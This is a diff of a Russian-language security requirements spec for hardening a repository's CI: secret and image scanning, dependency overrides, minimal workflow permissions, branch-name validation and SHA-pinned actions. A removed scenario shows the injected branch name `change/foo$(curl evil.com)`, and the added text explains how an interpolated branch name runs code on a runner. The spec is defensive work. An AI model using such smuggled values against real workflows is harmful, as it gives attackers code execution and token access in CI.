@@ -1,80 +1,82 @@
 ## ADDED Requirements
 
-### Requirement: SAST-сканирование в CI
-CI pipeline SHALL запускать static analysis для поиска секретов в коде и коммитах через `gitleaks/gitleaks-action` на каждый pull request и push. Job MUST падать при обнаружении high-confidence секретов.
+### Requirement: Поиск секретов в CI
+CI SHALL запускать поиск секретов по изменениям на каждый pull request и падать при находке. Прецедент уже есть: артефакты change'а приехали в репозиторий с боевыми значениями открытым текстом, и ни один автоматический гейт этого не заметил.
 
-#### Scenario: Коммит с секретом
-- **WHEN** PR содержит изменения с AWS access key в коде
-- **THEN** CI job `gitleaks` падает с указанием файла и строки
+#### Scenario: Секрет в изменениях
+- **WHEN** в PR попадает ключ или пароль, распознаваемый сканером
+- **THEN** проверка падает с указанием файла и строки, PR не вливается
 
-#### Scenario: Чистый коммит
-- **WHEN** PR не содержит секретов
-- **THEN** CI job `gitleaks` проходит успешно
+#### Scenario: Изменения без секретов
+- **WHEN** в PR секретов нет
+- **THEN** проверка проходит
 
-### Requirement: Dependency audit gate
-CI pipeline SHALL запускать `pnpm audit --prod --audit-level=high` на каждый PR. Job MUST падать при наличии known high/critical CVE в production-зависимостях.
+### Requirement: Гейт по уязвимостям зависимостей
+CI SHALL запускать аудит production-зависимостей на каждый PR и падать при наличии уязвимостей высокого и критического уровня.
 
 #### Scenario: Уязвимая зависимость
-- **WHEN** в `pnpm-lock.yaml` присутствует зависимость с high CVE
-- **THEN** CI job `audit` падает с описанием CVE и путём обновления
+- **WHEN** в локфайле появляется production-зависимость с уязвимостью высокого уровня
+- **THEN** проверка падает с описанием и путём обновления
 
-#### Scenario: Все зависимости чисты
-- **WHEN** lockfile не содержит known high/critical CVE
-- **THEN** job `audit` проходит успешно
+### Requirement: Сканирование образов
+CI SHALL сканировать собираемые образы на известные уязвимости и падать при критических. Базовый образ (`node:24-alpine`, `caddy:2-alpine`) обновляется вне репозитория, и без сканирования о протухшем базовом слое никто не узнаёт.
 
-### Requirement: Container image scanning
-CI pipeline SHALL сканировать собранные Docker-образы на known CVE через `aquasecurity/trivy-action`. Job MUST падать при наличии critical CVE в финальном образе.
+#### Scenario: Критическая уязвимость в образе
+- **WHEN** собранный образ содержит пакет с критической уязвимостью
+- **THEN** проверка падает с указанием пакета и слоя
 
-#### Scenario: Образ с critical CVE
-- **WHEN** собранный backend-образ содержит библиотеку с critical CVE
-- **THEN** CI job `trivy` падает с описанием уязвимости и слоя
+### Requirement: Принудительные версии транзитивных зависимостей
+Корневой `package.json` SHALL фиксировать через `pnpm.overrides` минимальные версии пакетов, которые тянутся транзитивно и имеют известные уязвимости.
 
-### Requirement: Pin критичных зависимостей через overrides
-`package.json` SHALL содержать `pnpm.overrides`, форсящие минимальные версии пакетов с known CVE: `"tar": "^7.5.16"` и `"multer": "^2.2.0"`.
+Прямые зависимости уже в порядке: backend объявляет `multer@^2.2.0`, в локе есть `tar@7.5.19`. Проблема в транзитивных: `multer@2.1.1` приходит из `@nestjs/platform-express`, `tar@6.2.1` — из цепочки сборки. Override нужен именно для того, чтобы они подтянулись к безопасным версиям, а не для прямых зависимостей, которые уже подняты.
 
-#### Scenario: Override tar-зависимости
-- **WHEN** выполняется `pnpm install`
-- **THEN` в `pnpm-lock.yaml` любая транзитивная `tar` имеет версию ≥ 7.5.16
+#### Scenario: Транзитивная версия поднята
+- **WHEN** выполняется установка зависимостей
+- **THEN** в локфайле не остаётся `multer` ниже 2.2.0, включая транзитивные вхождения
 
-### Requirement: Минимальные permissions для CI workflows
-Каждый GitHub Actions workflow SHALL содержать явный блок `permissions:` с минимально необходимыми правами. Дефолтный `GITHUB_TOKEN` MUST иметь `contents: read` (или меньше) для всех CI jobs, не требующих записи.
+### Requirement: Явные permissions во всех workflow
+Каждый workflow SHALL объявлять `permissions` с минимально необходимыми правами. В `change-bootstrap.yml`, `change-complete.yml` и `spec-gate.yml` блок уже есть; в `ci.yml` его нет, и job работает с правами по умолчанию для репозитория.
 
-#### Scenario: ci.yml без write permissions
-- **WHEN** выполняется `cat .github/workflows/ci.yml | grep permissions`
-- **THEN** вывод содержит `permissions:` с `contents: read` или более узкими правами
+#### Scenario: ci.yml с минимальными правами
+- **WHEN** проверяется конфигурация `ci.yml`
+- **THEN** в нём объявлен `permissions` с правами не шире `contents: read`
 
-### Requirement: OIDC вместо long-lived PAT
-Автоматизация, создающая PR/issue от имени бота (change-bootstrap, change-complete workflows), SHALL использовать GitHub App + OIDC token exchange вместо long-lived Personal Access Token (`FLOW_TOKEN`).
+### Requirement: Отказ от долгоживущего PAT
+Автоматизация, создающая issue и PR (`change-bootstrap.yml`, `change-complete.yml`), SHALL работать от токена GitHub App с ограниченным сроком жизни вместо постоянного personal access token `FLOW_TOKEN`.
 
-#### Scenario: Удаление FLOW_TOKEN секрета
-- **WHEN** выполняется `gh secret list` на репозитории
-- **THEN** список не содержит `FLOW_TOKEN`
+#### Scenario: FLOW_TOKEN удалён
+- **WHEN** проверяется список секретов репозитория
+- **THEN** `FLOW_TOKEN` в нём отсутствует, а workflow продолжают создавать issue и PR
 
-### Requirement: Валидация имени change-ветки
-Workflows `change-bootstrap.yml` и `change-complete.yml` SHALL валидировать переменную `${ID}` (извлечённую из имени ветки `change/<id>`) против regex `^[a-z0-9-]{1,40}$` перед любой интерполяцией в shell-команды или `gh`-вызовы.
+### Requirement: Имя change-ветки не попадает в shell без проверки
+Workflow'ы SHALL проверять идентификатор change'а, извлечённый из имени ветки, прежде чем использовать его в shell-командах.
 
-#### Scenario: Валидное имя ветки
-- **WHEN** workflow запускается на ветке `change/add-feature-foo`
-- **THEN` шаг с regex-валидацией проходит успешно и `ID=add-feature-foo` используется в скриптах
+Проблема конкретна: в `change-bootstrap.yml` шаг создания лейбла подставляет `${{ steps.change.outputs.id }}` прямо в строку команды. Подстановка выражения происходит до запуска shell, то есть содержимое имени ветки становится частью скрипта. Имена git-веток допускают `;`, `$`, `(`, `)` и обратные кавычки — ветка `change/x;<команда>` выполнит произвольный код в раннере с доступом к токену автоматизации. Остальные шаги передают значение через `env:` и этой проблемы не имеют; требование — привести к этому виду все подстановки и дополнительно проверить идентификатор регулярным выражением.
 
-#### Scenario: Инъекция через имя ветки
-- **WHEN` workflow запускается на ветке `change/foo$(curl evil.com)`
-- **THEN** шаг regex-валидации падает, и последующие шаги пропускаются
+#### Scenario: Обычное имя ветки
+- **WHEN** workflow запускается на ветке вида `change/add-feature-foo`
+- **THEN** проверка проходит, идентификатор используется дальше
 
-### Requirement: Блокировка fork-PR с доступом к секретам
-Workflows, использующие секреты репозитория (GitHub App token, etc.), SHALL содержать guard `if: github.event.pull_request.head_repo.full_name == github.repository` для блокировки запуска на PR из форков.
+#### Scenario: Имя ветки с shell-метасимволами
+- **WHEN** workflow запускается на ветке, имя которой содержит shell-метасимволы
+- **THEN** проверка падает до любых вызовов, и команда из имени ветки не выполняется
+
+### Requirement: Workflow с секретами не запускается на PR из форков
+Workflow'ы, использующие секреты репозитория, SHALL явно ограничиваться PR из самого репозитория.
+
+Это защита в глубину, а не закрытие активной дыры: на событие `pull_request` из форка GitHub секреты не передаёт, поэтому утечь `FLOW_TOKEN` этим путём сейчас не может. Требование фиксирует инвариант на случай смены события на `pull_request_target` или появления workflow с `workflow_run`, где секреты уже доступны.
 
 #### Scenario: PR из форка
-- **WHEN** PR открыт из `evil/fuse` (форк) и триггерит `change-complete.yml`
-- **THEN** шаги, требующие секретов, пропускаются (job завершается без side effects)
+- **WHEN** PR открыт из форка и триггерит workflow с секретами
+- **THEN** шаги, требующие секретов, не выполняются
 
 #### Scenario: PR из основного репозитория
-- **WHEN** PR открыт из branch в `owner/fuse`
-- **THEN** workflow выполняется нормально с доступом к секретам
+- **WHEN** PR открыт из ветки самого репозитория
+- **THEN** workflow отрабатывает как обычно
 
-### Requirement: Pin CI-зависимостей по commit SHA
-Все `uses:` директивы в GitHub Actions workflows SHALL пиниться по полному commit SHA (40-символьный hash), а не по mutable-тегу (`@v4`). Допускается pin по SHA с сопровождаемым комментарием, указывающим версию (например, `@<sha> # v4.1.0`). This prevents supply-chain attacks via tag re-pointing.
+### Requirement: Actions закреплены по коммиту
+Все `uses:` SHALL указывать полный commit SHA с комментарием версии. Сейчас везде стоят подвижные теги (`actions/checkout@v4`, `pnpm/action-setup@v4`, `actions/setup-node@v4`): тег переставляется владельцем action в любой момент, и содержимое шага меняется без изменения репозитория.
 
-#### Scenario: actions/checkout pinned
-- **WHEN** выполняется `grep -r "uses: actions/checkout" .github/workflows/`
-- **THEN** вывод содержит SHA-пин (например, `@<40-char-sha> # v4.1.0`), а не `@v4`
+#### Scenario: Шаги закреплены
+- **WHEN** проверяются директивы `uses:` в workflow
+- **THEN** каждая указывает 40-символьный SHA с комментарием, какой версии он соответствует
